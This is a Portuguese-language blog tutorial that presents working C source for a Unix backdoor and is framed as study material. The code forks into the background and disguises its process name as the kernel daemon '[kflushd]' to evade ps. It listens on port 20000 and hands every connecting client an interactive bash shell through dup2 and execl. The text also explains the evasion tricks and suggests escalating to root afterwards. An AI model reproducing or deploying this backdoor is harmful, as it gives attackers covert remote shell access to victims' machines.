---
layout: post
title: writing backdoor in C sockets berkeley [UNIX] 0xc6
categories: [C programming]
tags: [sockets,berkeley,unix,backdoor,0xc6, C]
fullview: true
comments: true
---

<p>Continuando com nosso artigos sobre <a>C</a>, depois de um keylogger vamos brincar mais um pouco com socket's, primeiro o que é um backdoor ? , também conhecido como portas dos fundos, não o canal no youtube tou falando sem humor aqui o blackdoor é de titânio. O backdoor o que ele faz é criar um processo que levante um serviço que devolve uma shell para o atacante, certamente vai fazer uma conexão reversa ou direta(bind), hoje em dia é comum achar apenas para conexão reversa pois de uns anos pra cá ouve a necessidade de a vitima se conectar ao atacante isso tudo pelo fato dos IPs dinâmicos, que mudam constantemente, mas em servidores WEB são muito comum ataque desse tipo já o IP torna-se estático. Qual a utilidade de aprender a criar um backdoor ? meu amigo, quando você entende como criar um backdoor isso exige um conhecimento básico em redes + algumas coisa sobre programação digamos que básico também, a criação de um backdoor para estudos nós dar uma ideia de como funciona os Trojan e backdoor sofisticados que são usando no mercado negro alguns com funções que da pra comprar com Trojan, fora que você pode está desenvolvendo outras coisas que ao meu ver pode ajuda-lo na busca de conhecimento. Tranquilo ? beleza...</p>
<p>Os Headers</p>
{% highlight c++ %}
// Retire os espaço dos header's
#include < stdio.h >
#include < stdlib.h >
#include < errno.h  >
#include < strings.h >
#include < netinet/in.h >
#include < sys/socket.h >
#include < sys/types.h >
#include < signal.h >
{% endhighlight  %}
<p>Basicamente todos os header ja conhecemos, com exerção de alguns como <a>signal.h</a> a ideia de usa-lo é para tratar alguns erro de hardware que possa fazer com que nosso backdoor não funcione corretamente tipo A função signal() associa um comportamento que o processo deve ter ao receber o sinal, que pode ser o comportamento padrão, ignorar o sinal ou executar uma função específica. Em especial os sinais SIGKILL e SIGSTOP não podem ser tradados com uma função ou ignorados, é bem comum ver SIGSEGV em muitos programas maliciosos, até porque não é vindo uma Falha de segmentação que interrompe a execução por violação de memoria e etc... o cabeçalho errno.h como nome já diz tratamento de erro, pode-se usar perror.h também é escolha . quando importamos essa biblioteca é necessário importa outras que vão ajudar no tratamento como stdio.h para os printf que auxilia no tratamento da saída da msg e e strerror definida em string.h que fornece a string de caracteres com a mensagem de erro. </p>
``` c++
#define MINHA_PORTA 20000 /* A porta do servidor */
#define BACKLOG        5 /* Até quantas conexões */

int main(int argc, char *argv[])
{

	int Meusocket, Novosocket, tamanho;
	struct sockaddr_in local;
	struct sockaddr_in remote;
```
<p>Se você já acompanha nossa serie sobre socket em C não ter problemas algum com esses códigos acima, não tem nenhuma diferença. mas explicando assim mesmo criamos dois descritor ou dois socket e uma variável tamanho, essa variável tamanho vai ser usada na função  accept()  se não lembra int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen); é preciso calcular o tamanho da estrutura addr que nesse caso vai ser nosso endereço, e temos a criação das duas estruturas a local e remota.</p>
``` c++
/* Cria um processo crianca ou menor, para não necessitar executar
	   usando & */
	if(fork() == 0){
		strcpy(argv[0], "[kflushd]");
		signal(SIGCHLD, SIG_IGN);

		/* Criando a estrutura local(servidor) */

		bzero(&local, sizeof(local));
		local.sin_family = AF_INET;
		local.sin_port = htons(MINHA_PORTA);
		local.sin_addr.s_addr = INADDR_ANY;
		bzero(&(local.sin_zero), 8);

```
<p> A syscall fock() é usada para criar processo, lá do nosso header <a>sys/types.h</a>. Ela não tem argumento e sempre retorna o PID do processo ela retorna uma valor positivo, nesse caso vamos criar um processo filho se ele voltar  0 quer dizer que nosso processo filho foi criado com sucesso :D  Unix fará uma exata cópia do espaço de endereço do pai e dá-lo à criança. Portanto, os processos pai e filho têm separado espaços de endereçamento. Logo em seguida vem a manha( R1,R1,O R2, cima,baixo,cima,baixo,cima,baixo). se você teve infância verá que é a manha de tirar a polícia no GTA Sanadreas, é a mesma coisa que estamos fazendo ali em cima, vamos supor que a vitima tente dar uma de espertinha e dar um ps aux no terminal para ver os processo e achar e matar nosso backdoor, a ideia é mudar o nome do nosso backdoor para <a>kflushd</a> ou qualque nome de processo que seja nativo do Unix um daemon da vida também pode ajudar. Agora vem nossa estrutura local, como assim ? vai me dizer que já esqueceu precisamos definir o que vamos criar bzero() já falei sobre ela  pode-se usar memset() o compilador não vai reclamar, mas bzero é mais eficiente devido ao fato de que é apenas nunca vai ser zerar a memória, então ele não tem que fazer qualquer verificação adicional que memset pode fazer. Isso ainda não significa necessariamente parecer uma razão absolutamente não usar memset para zerar a memória embora. em seguida, definimos a familia do socket e convertermos o valor da variável <a>MINHA_PORTA</a> com a função htons(), que converte os valores entre o host e network byte order. definimos o IP e preenchermos de zero nossa estrutura para fechar os 16 bytes :D.</p>
``` c++
/* Declaração do socket(),bind() e listen() */

		Meusocket=socket(AF_INET, SOCK_STREAM, 0);
		bind(Meusocket, (struct sockaddr *)&local, sizeof(struct sockaddr));
		listen(Meusocket, BACKLOG);
		tamanho = sizeof(struct sockaddr_in);


```
<p>E agora declaração das conexões, definimos nosso descritor, criamos o bind() int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen); A bind() é a mesma coisa que ligar() quando criamos um socket() não tem nenhuma atribuição dos nosso dados local, ou seja, a nossa estrutura precisa ser atribuída, especificado por addr ào socket referido pelo descritor de arquivo sockfd que é nosso descritor  Meusocket. addrlen especifica o tamanho, em bytes, da estrutura de endereço apontado pelo addr . tradicionalmente, esta operação é chamada de "atribuir um nome de um socket". lembra logo no início do nosso código definirmos uma viriável BACKLOG ela determinará a quantidade de cliente que podem se conectar ao meu backdoor. é preciso passar dois argumentos int listen(int sockfd, int backlog); o nosso descritor e inteiro que é a quantidade. depois vem o uso da variável tamanho que calcula o tamanho da estrutura socketaddr_in() que vai ser usado logo em seguida pelo nosso novosocket's criado.</p>
``` c++
while(1)
		{
			if((Novosocket=accept(Meusocket, (struct sockaddr *)&remote,&tamanho))==1)
			{
				perror("accept");
				exit(1);
			}

			if(!fork())
			{
				close(0); close(1); close(2);

				/* dup2() aqui é usado para criar uma copia de Novosocket */

				dup2(Novosocket, 0); dup2(Novosocket, 1); dup2(Novosocket,2);
		                   /* Entao a shell é executada, nesse caso uma bash
				   Mude-a para qualquer uma que quiser, e atenção ao
				   parâmetro -i, nem todas aceitam shell interativa */
				execl("/bin/bash","bash","-i", (char *)0);
				close(Novosocket);
				exit(0);
			}

		}
	}
	return(0);
}
```
<p>Agora vem onde acontece nossa shell até ia tudo bem virmos coisas que já conhecemos agora a coisa muda e ao mesmo tempo fica simples de entender, comecarmos logo com um while true logo depois do accept() sempre você verá algum do tipo, há muitos jeitos de fazer o mesmo fazer com que o programa nos devolva um shell seja ela por meio de um comando system()  ou execl, você pode encontrar outros backdoor com mensagem como assim mensagem, isso mesmo podemos fazer um programa tipo um chat , mas quando recebermos tal mensagem ativamos a nossa shellcode tipo assim "execute:ls -ln", já demostrei algum do tipo em python, em C não muda nada é  mesmo esquema. Em seguida, usamos a função fock() , é o mesmo esquema mandamos ela criar um processo filho, para executar nossa shell,caso ele não consiga criar ele vai sair, até porque não temos o <a>else{}</a> se ele voltar -1 no caso. Agora vem os  close() que fecha o descritor de arquivo associado com a saída padrão para o processo atual, re-atribui a saída padrão para um novo descritor de arquivo e fecha o descritor de arquivo original, isso é preciso pois vamos fazer uma copia usável do novosocket() quando você usa o fock() você pode fazer duas coisas A primeira é a de abrir / dev / tty que lhe dará acesso ao seu dispositivo terminal (assumindo que o dispositivo de terminal é o que você quer em vez do identificador de arquivo original). A segunda é a dup que identificador de arquivo antes de fechá-lo para que você tenha uma cópia utilizável. Então, você pode usar dup2 para obtê-lo de volta. Nesse caso usamos o dup2() apenas para copiar nosso novosocket que está sendo usado na conexão.Já o execl() lógico executa um comando , nesse caso uma shell interativa -i, O último parâmetro deve ser sempre 0. É um terminador NULL . Uma vez que a lista de argumentos é variável que deve ter alguma maneira de dizer C quando está para acabar. O terminador NULL faz este trabalho.onde caminho aponta para o nome do arquivo contendo um comando que deve ser executado, argo aponta para uma string que é o mesmo que caminho (ou pelo menos o seu último componente. arg1 ... argn são ponteiros para argumentos para o comando e 0 simplesmente marca o final da lista (variável) de argumentos. depos fechamos nosso socket's. agora é só testar :D. é isso um backdoor para estudos entender como funciona, em breve veremos outro vamos dizer que avançado, isso é tudo pessoal, lembre-se  usem porta do acima de 1024 já que com elas pode executar sem ter privilégios root, depois da pra tentar fazer o root verificando a versão do kernel.
Referências:</p>
<pre>
Nash Leon
http://www-usr.inf.ufsm.br/~giovani/sockets/sockets.txt
http://gnosis.cx/publish/programming/sockets.html
http://www.csd.uoc.gr/~hy556/material/tutorials/cs556-3rd-tutorial.pdf
</pre>
